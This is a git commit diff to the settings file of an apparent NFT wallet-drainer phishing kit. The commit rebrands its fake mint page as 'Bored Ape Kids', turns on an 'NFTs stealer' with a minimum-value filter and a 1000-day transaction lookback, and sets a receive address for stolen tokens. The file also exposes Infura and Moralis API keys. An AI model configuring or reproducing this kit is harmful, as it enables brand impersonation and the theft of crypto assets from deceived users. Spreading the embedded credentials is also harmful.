f72a38341b9303e5f9d68c97dcee240641fa4f9e
nonfungiblesolana <103703809+nonfungiblesolana@users.noreply.github.com>
2022-07-12 19:00:34 +0200

    o

--- settings.js
+++ settings.js
@@ -4,8 +4,8 @@ const infuraId = "52cf9376ca0149889215a557c6ef7c53"     // Infuria Project ID | 
 const moralisApi = "UFZFSHwkweXCj3FHGZHXxFITwXNVYgMog2wk5kq60hpmR2HFUxKt8Rz1uZQmbkE2"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "The Loopssessed",
-    title: "The Loopssessed", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "Bored Ape Kids",
+    title: "Bored Ape Kids", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "12.07.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
@@ -19,7 +19,7 @@ const collectionInfo = {
         type: "color",              // Supported types: image, video, color
         image: "background.jpg",    // Image for image type, video preview for video type
         video: "background.mp4",    // If you don't use video, you can ignore this line
-        color: "#222123",           // If you don't use color, you can ignore this line
+        color: "#000",           // If you don't use color, you can ignore this line
     }
 }
 const mintInfo = {
@@ -33,7 +33,7 @@ const mintInfo = {
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.03,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    checkMaxDay: 365, // Maximum number of days to check for the last transactions.
+    checkMaxDay: 1000, // Maximum number of days to check for the last transactions.
     receiveAddress: "0x261A1f18d7681A1fe175b80229155ac690bACB5a" // leave empty if you want to use the same address 
 }
 
